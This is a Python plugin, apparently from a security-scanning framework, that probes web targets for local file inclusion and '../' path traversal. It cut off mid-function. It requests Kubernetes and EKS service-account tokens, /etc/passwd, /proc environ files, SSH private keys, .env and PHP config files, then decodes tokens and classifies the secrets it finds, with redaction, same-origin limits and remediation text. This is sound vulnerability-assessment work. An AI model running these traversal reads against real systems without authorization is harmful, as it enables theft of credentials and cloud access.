"""
HTTP-only path-style + traversal LFI exposure probe.

This tool is intentionally separate from param:probe and param:exploit_probe:
those tools mutate query/form parameters with generic OS-file payloads
(``../../etc/passwd``) and emit ``xasm-lfi-path-traversal``. This one validates
direct absolute-path reads such as https://target//var/run/secrets/... AND —
as the genuinely-new #318 capability — **application secrets reached by ``../``
traversal through the download / files-contents file parameter family**
(``.env`` / ``APP_KEY``, SSH private keys, ``config/*.php``), with body
classification + secret redaction for those file types.

It deliberately COMPLEMENTS (never duplicates) its siblings:
  * ``param:exploit_probe._probe_lfi`` already owns generic OS-file traversal.
  * ``git:source_disclosure_scanner`` owns ``.git`` exposure + history secret
    mining, and nuclei ``http/exposures/`` owns naive root ``GET /.env`` /
    ``GET /.git/*``. This probe therefore NEVER does a naive root ``.env`` GET
    and NEVER touches ``.git`` — its value is the secret reached by escaping a
    media/webroot via ``../`` (or surfaced as a MySQL ``LOAD_FILE()`` read).
"""

import base64
import hashlib
import json
import os
import re
import time
from html.parser import HTMLParser
from pathlib import Path
from typing import Any, ClassVar, Dict, List, Optional, Tuple
from urllib.parse import parse_qsl, urlencode, urljoin, urlparse, urlunparse

import aiohttp

from plugin_interface import ToolPlugin
from tools._agentic_exploration_common import (
    dedupe_keep_order,
    normalize_url,
    parse_headers,
    read_limited,
    same_origin,
)

DEFAULT_PATHS = [
    "/var/run/secrets/kubernetes.io/serviceaccount/token",
    "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
    "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    "/var/run/secrets/eks.amazonaws.com/serviceaccount/token",
    "/etc/hostname",
    "/etc/hosts",
    "/etc/resolv.conf",
    "/etc/passwd",
    "/etc/group",
    "/etc/os-release",
    "/etc/issue",
    "/proc/self/cgroup",
    "/proc/self/mountinfo",
    "/proc/self/environ",
    "/proc/1/environ",
    "/proc/1/cmdline",
    "/proc/self/cmdline",
]

NEGATIVE_CONTROL_PATH = "/this/path/should/not/exist/xasm-lfi-negative-control"
JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$")
HOSTNAME_RE = re.compile(r"^[A-Za-z0-9](?:[A-Za-z0-9_.-]{0,252}[A-Za-z0-9])?$")
HOSTS_LINE_RE = re.compile(r"(?m)^\s*(?:\d{1,3}\.){3}\d{1,3}\s+\S+")
RESOLV_LINE_RE = re.compile(r"(?m)^\s*(?:nameserver|search|options)\s+\S+")
LFI_PARAM_NAMES = {
    "file",
    "filepath",
    "file_path",
    "filename",
    "path",
    "full_path",
    "content",
    "page",
    "template",
    "include",
    "view",
    "doc",
    "document",
    "download",
    "url",
    "uri",
    "redirect",
    "next",
    "return",
}
LFI_TEMPLATE_RE = re.compile(
    r"\{(?:full_?path|file_?path|filepath|filename|file|path)(?::[^}]+)?\}"
    r"|<path:[^>]+>"
    r"|:[A-Za-z_]*(?:path|file|filename)[A-Za-z_]*"
    r"|\*"
)

# --- #318 sensitive-file pack (application secrets, reached via ``../`` traversal) ---
# Relative app secrets live under a webroot/media root and are reached by escaping
# it with ``../``. NOTE: ``.git`` is intentionally absent — owned by
# git:source_disclosure_scanner; naive root ``.env`` GETs are owned by nuclei.
SENSITIVE_REL_FILES = [
    ".env",
    ".env.local",
    ".env.production",
    "config/database.php",
    "config/config.php",
    "config/app.php",
    "app/etc/env.php",
    "wp-config.php",
]
# Absolute system secrets (also worth a path-style ``//`` read).
SENSITIVE_ABS_FILES = [
    "/root/.ssh/id_rsa",
    "/var/www/.env",
    "/var/www/html/.env",
    "/var/www/deploy/.env",
]
SENSITIVE_SSH_USERS = ["root", "ubuntu", "www-data", "admin", "deploy", "git", "app", "sherman"]
# Parameter names whose value is a filesystem path we will fuzz with ``../`` traversal.
TRAVERSAL_PARAM_NAMES = {
    "attachment",
    "content",
    "doc",
    "document",
    "download",
    "file",
    "file_path",
    "filepath",
    "filename",
    "folder",
    "full_path",
    "image",
    "include",
    "lang",
    "page",
    "path",
    "report",
    "resource",
    "template",
    "view",
}
DEFAULT_TRAVERSAL_DEPTHS = [1, 2, 3, 4, 5, 6, 7, 8]

# Positive content signatures for the new classifications (FP-safe: a status-200
# SPA page never matches these without the actual secret bytes).
PRIVATE_KEY_RE = re.compile(r"-----BEGIN (?:OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----")
PRIVATE_KEY_TYPE_RE = re.compile(r"-----BEGIN (OPENSSH|RSA|EC|DSA|PGP|ENCRYPTED) PRIVATE KEY-----")
DOTENV_LINE_RE = re.compile(r"(?m)^[ \t]*(?:export[ \t]+)?[A-Z][A-Z0-9_]+=")
DOTENV_KV_RE = re.compile(r"(?m)^[ \t]*(?:export[ \t]+)?([A-Z][A-Z0-9_]+)=(.*)$")
DOTENV_STRONG_KEYS = (
    "APP_KEY=",
    "DB_PASSWORD=",
    "DB_USERNAME=",
    "DB_DATABASE=",
    "AWS_SECRET_ACCESS_KEY=",
    "AWS_ACCESS_KEY_ID=",
    "SECRET_KEY=",
    "MAIL_PASSWORD=",
    "REDIS_PASSWORD=",
    "JWT_SECRET=",
    "STRIPE_SECRET",
)
LARAVEL_APP_KEY_RE = re.compile(r"(?m)^[ \t]*APP_KEY=(?:base64:)?[A-Za-z0-9+/=]{8,}")
PHP_CONFIG_RE = re.compile(r"<\?php")
PHP_CONFIG_MARKER_RE = re.compile(
    r"define\s*\(|'password'|\"password\"|DB_PASSWORD|DB_USER|DB_HOST|"
    r"DB_DATABASE|mysqli?_connect|new\s+PDO|getenv\(",
    re.I,
)
# Recognition-only: a MySQL LOAD_FILE() DB-layer read primitive observed in the
# request/param (this GET-only tool never executes SQLi — it tags the read).
LOAD_FILE_RE = re.compile(r"LOAD_FILE\s*\(\s*['\"]?(?P<path>[^'\")]+)", re.I)
UNSAFE_DISCOVERY_PATH_RE = re.compile(
    r"(?:^|/)(?:logout|log-out|signout|sign-out|delete|destroy|remove|unsubscribe)(?:/|$)",
    re.I,
)
DISCOVERY_SKIP_EXTENSIONS = {
    ".7z",
    ".avi",
    ".css",
    ".gif",
    ".gz",
    ".ico",
    ".jpeg",
    ".jpg",
    ".js",
    ".mov",
    ".mp3",
    ".mp4",
    ".pdf",
    ".png",
    ".svg",
    ".tar",
    ".webm",
    ".webp",
    ".woff",
    ".woff2",
    ".zip",
}


class _SurfaceHtmlParser(HTMLParser):
    """Collect URL-bearing HTML attributes without executing page content."""

    URL_ATTRIBUTES: ClassVar[set[str]] = {"href", "src", "action", "data-src", "poster"}

    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.urls: List[str] = []
        self.page_links: List[str] = []

    def handle_starttag(self, tag: str, attrs: List[Tuple[str, Optional[str]]]) -> None:
        lowered_tag = str(tag or "").lower()
        for name, value in attrs:
            lowered_name = str(name or "").lower()
            if lowered_name not in self.URL_ATTRIBUTES or not value:
                continue
            candidate = str(value).strip()
            if candidate:
                self.urls.append(candidate)
                if lowered_tag == "a" and lowered_name == "href":
                    self.page_links.append(candidate)


class LfiFileExposureProbeTool(ToolPlugin):
    @property
    def name(self) -> str:
        return "lfi:file_exposure_probe"

    @property
    def description(self) -> str:
        return (
            "Runs bounded GET-only checks for path-style LFI file disclosure, "
            "including Kubernetes/EKS service-account token exposure."
        )

    @property
    def schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "target": {"type": "string"},
                "url": {"type": "string"},
                "enabled": {"type": "boolean", "default": True},
                "sensitiveFilePack": {"type": "boolean", "default": True},
                "sensitiveFiles": {"type": "array", "items": {"type": "string"}},
                "traversalDepth": {"type": "integer", "default": 8},
                "paths": {"type": "array", "items": {"type": "string"}},
                "urls": {"type": "array", "items": {"type": "string"}},
                "discoveredUrls": {"type": "array", "items": {"type": "string"}},
                "apiEndpoints": {"type": "array"},
                "surfaceGraph": {"type": "object"},
                "discoverFromTarget": {"type": "boolean", "default": True},
                "maxDiscoveryPages": {"type": "integer", "default": 3},
                "maxDiscoveredUrls": {"type": "integer", "default": 120},
                "maxDiscoveryBytes": {"type": "integer", "default": 500000},
                "pathJoinMode": {"type": "string", "default": "double-slash"},
                "maxPaths": {"type": "integer", "default": 80},
                "maxRequests": {"type": "integer", "default": 120},
                "maxBytes": {"type": "integer", "default": 250000},
                "timeoutSeconds": {"type": "integer", "default": 20},
                "includeNegativeControl": {"type": "boolean", "default": True},
                "stopAfterFirstFinding": {"type": "boolean", "default": True},
                "negativeControlPath": {"type": "string", "default": NEGATIVE_CONTROL_PATH},
                "keepRawEvidence": {"type": "boolean", "default": True},
                "includeRawBodies": {"type": "boolean", "default": False},
                "includeHttpTranscript": {"type": "boolean", "default": True},
                "responseExcerptBytes": {"type": "integer", "default": 4096},
                "decodeJwt": {"type": "boolean", "default": True},
                "artifactRoot": {"type": "string", "default": "/tmp/xasm-lfi-evidence"},
                "headers": {"type": "object"},
                "authHeaders": {"type": "object"},
                "cookie": {"type": "string"},
                "authCookies": {"type": "string"},
            },
            "oneOf": [{"required": ["target"]}, {"required": ["url"]}],
        }

    @property
    def metadata(self):
        return {
            "category": "agentic-recon",
            "phase": 3,
            "domain": ["web"],
            "input_type": ["url"],
            "output_type": ["findings", "lfi_file_exposure_results"],
            "chainable_after": ["browser:", "katana:", "param:", "surface:", "nuclei:", "decision:"],
            "chainable_before": ["nuclei:", "decision:"],
        }

    async def execute(self, parameters: Dict[str, Any]) -> Any:
        if parameters.get("enabled") is False:
            return {
                "success": True,
                "skipped": True,
                "tool": self.name,
                "reason": "disabled_by_policy",
                "findings": [],
                "summary": {"pathsChecked": 0, "confirmedReads": 0, "findings": 0},
            }
        target = normalize_url(parameters.get("target") or parameters.get("url") or "")
        if not target:
            return {"success": False, "error": "target or url is required"}
        parsed_target = urlparse(target)
        if parsed_target.scheme not in {"http", "https"} or not parsed_target.netloc:
            return {"success": False, "error": f"target must be an http(s) URL: {target}"}

        max_paths = max(1, min(int(parameters.get("maxPaths") or 80), 200))
        max_requests = max(1, min(int(parameters.get("maxRequests") or 120), 300))
        max_bytes = max(1024, min(int(parameters.get("maxBytes") or 250_000), 2_000_000))
        max_discovery_pages = max(1, min(int(parameters.get("maxDiscoveryPages") or 3), 8))
        max_discovered_urls = max(1, min(int(parameters.get("maxDiscoveredUrls") or 120), 300))
        max_discovery_bytes = max(4096, min(int(parameters.get("maxDiscoveryBytes") or 500_000), 2_000_000))
        timeout_seconds = max(3, min(int(parameters.get("timeoutSeconds") or 20), 120))
        decode_jwt = bool(parameters.get("decodeJwt", True))
        include_raw_bodies = bool(parameters.get("includeRawBodies", False))
        include_http_transcript = bool(parameters.get("includeHttpTranscript", True))
        response_excerpt_bytes = max(0, min(int(parameters.get("responseExcerptBytes") or 4096), 16384))
        keep_raw_evidence = bool(parameters.get("keepRawEvidence", True))

        caller_paths = isinstance(parameters.get("paths"), list)
        paths = parameters.get("paths") if caller_paths else DEFAULT_PATHS
        paths = [self._normalize_path(str(path)) for path in paths if str(path or "").strip()]
        # #318: also try absolute system secrets (SSH keys, /var/www/.env) as
        # path-style reads, unless the caller pinned an explicit path list.
        if not caller_paths and bool(parameters.get("sensitiveFilePack", True)):
            paths += [self._normalize_path(p) for p in SENSITIVE_ABS_FILES]
            paths += [self._normalize_path(f"/home/{user}/.ssh/id_rsa") for user in SENSITIVE_SSH_USERS]
        paths = dedupe_keep_order(paths, max_paths)

        negative_path = self._normalize_path(str(parameters.get("negativeControlPath") or NEGATIVE_CONTROL_PATH))
        include_negative_control = bool(parameters.get("includeNegativeControl", True))
        stop_after_first_finding = bool(parameters.get("stopAfterFirstFinding", True))
        probe_paths = list(paths)
        if include_negative_control:
            probe_paths = [negative_path, *[path for path in probe_paths if path != negative_path]]
        evidence_dir = None
        if keep_raw_evidence:
            evidence_dir = self._prepare_evidence_dir(parameters, target)

        headers = {
            "User-Agent": "xASM-lfi-file-exposure-probe/1.0",
            "Accept": "*/*",
            **parse_headers(parameters),
        }
        connector = aiohttp.TCPConnector(ssl=False)
        negative_hashes = set()
        results: List[Dict[str, Any]] = []
        findings: List[Dict[str, Any]] = []
        discovery: Dict[str, Any] = {"pagesFetched": 0, "urls": [], "errors": []}
        agent = parameters.get("_agent")

        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=timeout_seconds),
        ) as session:
            effective_parameters = dict(parameters)
            if bool(parameters.get("discoverFromTarget", True)):
                if agent:
                    agent.report_progress("Discovering same-origin file surfaces", target, 0, max_discovery_pages)
                discovery = await self._discover_surface_urls(
                    session,
                    target,
                    headers,
                    max_pages=max_discovery_pages,
                    max_urls=max_discovered_urls,
                    max_bytes=max_discovery_bytes,
                )
                supplied = parameters.get("discoveredUrls")
                supplied_urls = supplied if isinstance(supplied, list) else []
                effective_parameters["discoveredUrls"] = dedupe_keep_order(
                    [*supplied_urls, *discovery["urls"]],
                    max_discovered_urls,
                )

            probe_specs = self._build_probe_specs(
                target,
                probe_paths,
                effective_parameters,
                max_requests=max_requests,
                join_mode=str(parameters.get("pathJoinMode") or "double-slash"),
            )
            for index, spec in enumerate(probe_specs, 1):
                path = spec["path"]
                url = spec["url"]
                if agent:
                    agent.report_progress("Probing path-style LFI files", url, index - 1, len(probe_specs))
                if not same_origin(target, url):
                    results.append(
                        {
                            "path": path,
                            "url": url,
                            "success": False,
                            "classification": "out_of_scope",
                            "error": "constructed URL is outside target origin",
                            "source": spec.get("source"),
                        }
                    )
                    continue

                fetched = await self._fetch(
                    session,
                    url,
                    path,
                    headers,
                    max_bytes,
                    evidence_dir,
                    include_http_transcript,
                    response_excerpt_bytes,
                )
                if path == negative_path and fetched["sha256"]:
                    negative_hashes.add(fetched["sha256"])
                classification = self._classify_body(
                    path=path,
                    status=fetched["status"],
                    body=fetched["bodyText"],
                    sha256=fetched["sha256"],
                    negative_hashes=negative_hashes,
                    decode_jwt=decode_jwt,
                    is_negative_control=include_negative_control and path == negative_path,
                )
                evidence = {
                    **{k: v for k, v in fetched.items() if k != "bodyText"},
                    **classification,
                    "source": spec.get("source"),
                }
                if include_raw_bodies:
                    evidence["rawBody"] = fetched["bodyText"]
                # #318: never let a raw .env / private key / php-config body leave
                # the 0600 evidence dir — redact it from the returned results too.
                if evidence.get("secretExposure"):
                    evidence.pop("rawBody", None)
                    if evidence.get("responseTranscript"):
                        evidence["responseTranscript"] = (
                            f"HTTP {evidence.get('status')} — response body redacted "
                            f"({evidence.get('bytes')} bytes, sha256:{evidence.get('sha256')})"
                        )
                results.append(evidence)
                finding = self._finding_for_evidence(evidence)
                if finding:
                    findings.append(finding)
                    if stop_after_first_finding:
                        break

        findings = self._dedupe_findings(findings)
        raw_output = "\n".join(self._finding_line(f) for f in findings)
        return {
            "success": True,
            "verified": bool(findings),
            "fallback": False,
            "target": target,
            "tool": self.name,
            "evidenceDir": str(evidence_dir) if evidence_dir else None,
            "results": results,
            "findings": findings,
            "total_findings": len(findings),
            "findings_delivered": len(findings),
            "rawOutput": raw_output,
            "discovery": discovery,
            "summary": {
                "pathsChecked": len(results),
                "discoveryPages": discovery["pagesFetched"],
                "discoveredUrls": len(discovery["urls"]),
                "surfaceCandidates": len([r for r in results if r.get("source") != "direct-path"]),
                "confirmedReads": len([r for r in results if r.get("confirmedRead")]),
                "tokenExposures": len([r for r in results if r.get("tokenExposure")]),
                "secretExposures": len([r for r in results if r.get("secretExposure")]),
                "findings": len(findings),
            },
        }

    async def _discover_surface_urls(
        self,
        session: aiohttp.ClientSession,
        target: str,
        headers: Dict[str, str],
        *,
        max_pages: int,
        max_urls: int,
        max_bytes: int,
    ) -> Dict[str, Any]:
        """Bootstrap path-like surfaces from bounded same-origin HTML GETs."""
        queue = [target]
        queued = {target}
        visited = set()
        discovered: List[str] = []
        errors: List[str] = []

        while queue and len(visited) < max_pages and len(discovered) < max_urls:
            page_url = queue.pop(0)
            if page_url in visited or not same_origin(target, page_url):
                continue
            visited.add(page_url)
            try:
                async with session.get(page_url, headers=headers, allow_redirects=False) as response:
                    if response.status >= 400:
                        errors.append(f"{page_url}: HTTP {response.status}")
                        continue
                    content_type = str(response.headers.get("content-type") or "").lower()
                    body = await read_limited(response.content, max_bytes + 1)
                    if "html" not in content_type and not body.lstrip().lower().startswith((b"<!doctype html", b"<html")):
                        continue
                    parser = _SurfaceHtmlParser()
                    parser.feed(body[:max_bytes].decode("utf-8", errors="replace"))
                    for raw in parser.urls:
                        candidate = self._normalize_discovered_url(page_url, raw)
                        if (
                            candidate
                            and same_origin(target, candidate)
                            and not UNSAFE_DISCOVERY_PATH_RE.search(urlparse(candidate).path or "")
                        ):
                            discovered.append(candidate)
                    for raw in parser.page_links:
                        candidate = self._normalize_discovered_url(page_url, raw)
                        if (
                            candidate
                            and candidate not in queued
                            and candidate not in visited
                            and same_origin(target, candidate)
                            and self._is_safe_discovery_page(candidate)
                        ):
                            queued.add(candidate)
                            queue.append(candidate)
            except Exception as exc:
                errors.append(f"{page_url}: {str(exc)[:160]}")

        return {
            "pagesFetched": len(visited),
            "urls": dedupe_keep_order(discovered, max_urls),
            "errors": errors[:10],
        }

    def _normalize_discovered_url(self, base_url: str, raw: str) -> Optional[str]:
        candidate = str(raw or "").strip()
        if not candidate or candidate.startswith(("#", "javascript:", "mailto:", "tel:", "data:")):
            return None
        try:
            parsed = urlparse(urljoin(base_url, candidate))._replace(fragment="")
            if parsed.scheme not in {"http", "https"} or not parsed.netloc:
                return None
            return urlunparse(parsed)
        except Exception:
            return None

    def _is_safe_discovery_page(self, url: str) -> bool:
        parsed = urlparse(url)
        if UNSAFE_DISCOVERY_PATH_RE.search(parsed.path or ""):
            return False
        suffix = Path(parsed.path or "").suffix.lower()
        return suffix not in DISCOVERY_SKIP_EXTENSIONS

    async def _fetch(
        self,
        session: aiohttp.ClientSession,
        url: str,
        path: str,
        headers: Dict[str, str],
        max_bytes: int,
        evidence_dir: Optional[Path],
        include_http_transcript: bool,
        response_excerpt_bytes: int,
    ) -> Dict[str, Any]:
        try:
            async with session.get(url, headers=headers, allow_redirects=False) as response:
                body = await read_limited(response.content, max_bytes + 1)
                truncated = len(body) > max_bytes
                if truncated:
                    body = body[:max_bytes]
                body_text = body.decode("utf-8", errors="replace")
                sha256 = hashlib.sha256(body).hexdigest()
                artifact = self._write_artifacts(evidence_dir, path, response.headers, body) if evidence_dir else {}
                result = {
                    "path": path,
                    "url": url,
                    "status": response.status,
                    "headers": {
                        "content-type": response.headers.get("content-type"),
                        "content-length": response.headers.get("content-length"),
                    },
                    "bytes": len(body),
                    "sha256": sha256,
                    "truncated": truncated,
                    "bodyText": body_text,
                    **artifact,
                }
                if include_http_transcript:
                    result.update(
                        {
                            "requestTranscript": self._request_transcript(url, headers),
                            "responseTranscript": self._response_transcript(
                                response.status,
                                response.reason,
                                response.headers,
                                body,
                                truncated,
                                response_excerpt_bytes,
                            ),
                            "curlCommand": self._curl_command(url, headers),
                        }
                    )
                return result
        except Exception as exc:
            return {
                "path": path,
                "url": url,
                "status": None,
                "headers": {},
                "bytes": 0,
                "sha256": None,
                "truncated": False,
                "bodyText": "",
                "classification": "fetch_error",
                "error": str(exc)[:300],
            }

    def _classify_body(
        self,
        *,
        path: str,
        status: Optional[int],
        body: str,
        sha256: Optional[str],
        negative_hashes: set,
        decode_jwt: bool,
        is_negative_control: bool = False,
    ) -> Dict[str, Any]:
        if status is None:
            return {"classification": "fetch_error", "confirmedRead": False}
        if is_negative_control:
            return {"classification": "negative_control", "confirmedRead": False}
        stripped = (body or "").strip()
        if status >= 400:
            return {"classification": "not_readable", "confirmedRead": False}
        if sha256 and sha256 in negative_hashes and path != NEGATIVE_CONTROL_PATH:
            return {"classification": "fallback_body", "confirmedRead": False}

        decoded = self._decode_jwt(stripped) if decode_jwt and JWT_RE.match(stripped or "") else None
        if decoded:
            token_type = self._classify_jwt(path, decoded)
            return {
                "classification": token_type,
                "confirmedRead": True,
                "tokenExposure": True,
                "jwt": decoded,
            }
        lowered = stripped.lower()
        if self._looks_like_html_or_error_page(stripped):
            return {"classification": "html_or_error_page", "confirmedRead": False}
        if "-----begin certificate-----" in lowered:
            return {"classification": "kubernetes_ca_certificate", "confirmedRead": True}
        if path.endswith("/namespace") and stripped and re.match(r"^[a-z0-9][a-z0-9-]{0,62}$", stripped):
            return {"classification": "kubernetes_namespace", "confirmedRead": True, "namespace": stripped}
        if "root:x:0:0:" in lowered:
            return {"classification": "unix_passwd", "confirmedRead": True}
        if "root:x:0:" in lowered and "daemon:x:" in lowered:
            return {"classification": "unix_group", "confirmedRead": True}
        if "pretty_name=" in lowered or "id_like=" in lowered:
            return {"classification": "os_release", "confirmedRead": True}
        if path.endswith("/hostname") and self._looks_like_hostname_file(stripped):
            return {"classification": "container_hostname", "confirmedRead": True}
        if path.endswith("/hosts") and HOSTS_LINE_RE.search(stripped):
            return {"classification": "container_network_config", "confirmedRead": True}
        if path.endswith("/resolv.conf") and RESOLV_LINE_RE.search(stripped):
            return {"classification": "container_network_config", "confirmedRead": True}
        # --- #318 application-secret classifications. Placed AFTER the specific
        # OS/container-file classifiers (passwd / os-release / hostname / …) so that
        # e.g. /etc/os-release is not mistaken for a dotenv file, but BEFORE the
        # generic catch-alls. The HTML/error + negative-control + status>=400 guards
        # above already ran, so an SPA 200 cannot reach these positive-signature
        # branches. ---
        if PRIVATE_KEY_RE.search(stripped):
            type_match = PRIVATE_KEY_TYPE_RE.search(stripped)
            return {
                "classification": "private_key",
                "confirmedRead": True,
                "secretExposure": True,
                "keyType": type_match.group(1) if type_match else "UNKNOWN",
            }
        strong_keys = [key for key in DOTENV_STRONG_KEYS if key in stripped]
        if len(DOTENV_LINE_RE.findall(stripped)) >= 2 or strong_keys:
            has_aws_secret = "AWS_SECRET_ACCESS_KEY=" in stripped
            return {
                "classification": "dotenv_file",
                "confirmedRead": True,
                "secretExposure": True,
                "appKeyPresent": bool(LARAVEL_APP_KEY_RE.search(stripped)),
                "awsSecretPresent": has_aws_secret,
                "envMaskedPairs": self._redact_dotenv_pairs(stripped),
                "severityHint": "critical" if has_aws_secret else "high",
            }
        if PHP_CONFIG_RE.search(stripped) and PHP_CONFIG_MARKER_RE.search(stripped):
            return {
                "classification": "php_config_file",
                "confirmedRead": True,
                "secretExposure": True,
            }
        if status < 400 and body == "":
            return {"classification": "empty_pseudo_file_or_suppressed_read", "confirmedRead": False}
        if status < 400 and stripped:
            return {"classification": "unclassified_non_empty_response", "confirmedRead": False}
        return {"classification": "unknown", "confirmedRead": False}

    def _looks_like_html_or_error_page(self, body: str) -> bool:
        sample = str(body or "").strip().lower()[:4096]
        if not sample:
            return False
        if sample.startswith("<!doctype html") or sample.startswith("<html") or "<html" in sample:
            return True
        return any(
            marker in sample
            for marker in (
                "page not found",
                "not found",
                "404",
                "forbidden",
                "access denied",
                "oops",
            )
        ) and any(tag in sample for tag in ("<body", "<head", "<title", "<div", "<script"))

    def _looks_like_hostname_file(self, body: str) -> bool:
        stripped = str(body or "").strip()
        if not stripped or "\n" in stripped or "\r" in stripped or "/" in stripped or "<" in stripped:
            return False
        return bool(HOSTNAME_RE.match(stripped))

    def _classify_jwt(self, path: str, decoded: Dict[str, Any]) -> str:
        claims = decoded.get("claims") or {}
        aud = claims.get("aud")
        audiences = aud if isinstance(aud, list) else [aud]
        if "sts.amazonaws.com" in audiences or "eks.amazonaws.com" in path:
            return "eks_irsa_web_identity_token"
        if str(claims.get("sub") or "").startswith("system:serviceaccount:"):
            return "kubernetes_serviceaccount_token"
        return "jwt_token"

    def _decode_jwt(self, token: str) -> Optional[Dict[str, Any]]:
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return None
            header = json.loads(self._b64url_decode(parts[0]))
            claims = json.loads(self._b64url_decode(parts[1]))
            if "exp" in claims:
                claims["exp_utc"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(int(claims["exp"])))
                claims["seconds_until_exp"] = int(claims["exp"]) - int(time.time())
            sub = str(claims.get("sub") or "")
            if sub.startswith("system:serviceaccount:"):
                _, _, namespace, service_account = sub.split(":", 3)
                claims["serviceAccountRef"] = {
                    "namespace": namespace,
                    "serviceAccount": service_account,
                }
            return {"header": header, "claims": claims}
        except Exception:
            return None

    def _b64url_decode(self, value: str) -> str:
        padded = value + "=" * (-len(value) % 4)
        return base64.urlsafe_b64decode(padded.encode()).decode("utf-8", errors="replace")

    def _finding_for_evidence(self, evidence: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        classification = evidence.get("classification")
        if not evidence.get("confirmedRead") and classification != "empty_pseudo_file_or_suppressed_read":
            return None
        path = str(evidence.get("path") or "")
        url = str(evidence.get("url") or "")
        extracted = [path, f"sha256:{evidence.get('sha256')}", f"bytes:{evidence.get('bytes')}"]
        request = evidence.get("requestTranscript")
        response = evidence.get("responseTranscript")
        curl_command = evidence.get("curlCommand")
        # #318: for raw-secret reads (.env / private key / php config) the response
        # body excerpt would leak the credential — replace it with a redacted marker.
        # The request + curl (showing only the ../ traversal payload, never the
        # secret) are kept; raw bytes live in the 0600 evidence dir.
        sanitized_response = (
            f"HTTP {evidence.get('status')} — response body redacted "
            f"({evidence.get('bytes')} bytes, sha256:{evidence.get('sha256')}); "
            f"raw bytes retained only in the 0600 evidence directory"
        )

        if classification == "kubernetes_serviceaccount_token":
            claims = (evidence.get("jwt") or {}).get("claims") or {}
            return self._finding(
                template_id="xasm-kubernetes-serviceaccount-token-exposed",
                name="Kubernetes Service Account Token Exposed via LFI",
                severity="critical",
                matched_at=url,
                description=(
                    "Path-style LFI exposed a Kubernetes projected service-account token. "
                    "The token can authenticate as the pod's service account until expiry, "
                    "subject to cluster RBAC and API reachability."
                ),
                remediation="Block absolute-path file reads, rotate the pod, and review service-account RBAC.",
                matcher_name="kubernetes-serviceaccount-jwt",
                extracted=[*extracted, str(claims.get("sub")), str(claims.get("aud"))],
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification == "eks_irsa_web_identity_token":
            claims = (evidence.get("jwt") or {}).get("claims") or {}
            return self._finding(
                template_id="xasm-eks-irsa-token-exposed",
                name="EKS IRSA Web Identity Token Exposed via LFI",
                severity="critical",
                matched_at=url,
                description=(
                    "Path-style LFI exposed an EKS web-identity token with sts.amazonaws.com audience. "
                    "If the service account is trusted by an IAM role, this may allow AWS role assumption."
                ),
                remediation="Block absolute-path file reads, rotate the pod, and review IRSA trust/policies.",
                matcher_name="eks-irsa-jwt",
                extracted=[*extracted, str(claims.get("sub")), str(claims.get("aud"))],
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification in {"kubernetes_namespace", "kubernetes_ca_certificate"}:
            return self._finding(
                template_id="xasm-kubernetes-serviceaccount-file-exposed",
                name="Kubernetes Service Account File Exposed via LFI",
                severity="high",
                matched_at=url,
                description="Path-style LFI exposed Kubernetes service-account metadata or trust material.",
                remediation="Prevent reads outside an allowlisted file root and disable unnecessary token automounts.",
                matcher_name=str(classification),
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification in {"unix_passwd", "unix_group", "os_release", "container_hostname", "container_network_config"}:
            return self._finding(
                template_id="xasm-container-context-file-exposed",
                name="Container Context File Exposed via LFI",
                severity="high" if classification == "unix_passwd" else "medium",
                matched_at=url,
                description="Path-style LFI exposed container operating-system or network context.",
                remediation="Normalize requested paths and enforce a strict server-side file allowlist.",
                matcher_name=str(classification),
                extracted=extracted,
                request=request,
                response=response,
                curl_command=curl_command,
            )
        if classification == "private_key":
            key_type = str(evidence.get("keyType") or "UNKNOWN")
            extracted_pk = [path, f"key-type:{key_type}", f"sha256:{evidence.get('sha256')}", f"bytes:{evidence.get('bytes')}"]
            load_file = self._detect_load_file(url, path)
            if load_file:
                extracted_pk += ["db-primitive:mysql-load-file", f"load-file-path:{load_file['path']}"]
            finding = self._finding(
                template_id="xasm-lfi-private-key-exposed",
                name="Private Key Exposed via LFI/Traversal",
                severity="critical",
                matched_at=url,
                description=(
                    "Path traversal / LFI exposed a private key. The key material is "
                    "redacted here (type + sha256 only); raw bytes are retained solely "
                    "in the 0600 on-disk evidence directory."
                ),
                remediation="Reject ../ traversal and absolute paths, serve only mapped file identifiers, and rotate the exposed key.",
                matcher_name="openssh-private-key",
                extracted=extracted_pk,
                request=request,
                response=sanitized_response,
                curl_command=curl_command,
            )
            if load_file:
                finding["dbFileReadPrimitive"] = "mysql_load_file"
            return finding
        if classification in {"dotenv_file", "php_config_file"}:
            severity = str(evidence.get("severityHint") or "high")
            extracted_env = list(extracted)
            if evidence.get("appKeyPresent"):
                extracted_env.append("APP_KEY present (Laravel)")
            if evidence.get("awsSecretPresent"):
                extracted_env.append("AWS secret present")
            masked = evidence.get("envMaskedPairs")
            if isinstance(masked, list):
                extracted_env += masked
            if classification == "php_config_file":
                extracted_env.append("php-config:db-credentials-present")
            load_file = self._detect_load_file(url, path)
            if load_file:
                extracted_env += ["db-primitive:mysql-load-file", f"load-file-path:{load_file['path']}"]
            description = (
                "Path traversal / LFI exposed an application secret file (.env / config). "
                "Secret values are redacted (masked + sha256); raw bytes are retained "
                "solely in the 0600 on-disk evidence directory."
            )
            if load_file:
                description += " The read was surfaced via a MySQL LOAD_FILE() DB-layer primitive."
            finding = self._finding(
                template_id="xasm-lfi-app-secret-file-exposed",
                name="Application Secret File Exposed via LFI/Traversal",
                severity=severity,
                matched_at=url,
                description=description,
                remediation="Reject ../ traversal and absolute paths, keep secrets outside the web/media root, and rotate exposed credentials.",
                matcher_name="dotenv-app-secret" if classification == "dotenv_file" else "php-config-secret",
                extracted=extracted_env,
                request=request,
                response=sanitized_response,
                curl_command=curl_command,
            )
            if load_file:
                finding["dbFileReadPrimitive"] = "mysql_load_file"
            return finding
        if classification == "file_read":
            return self._finding(
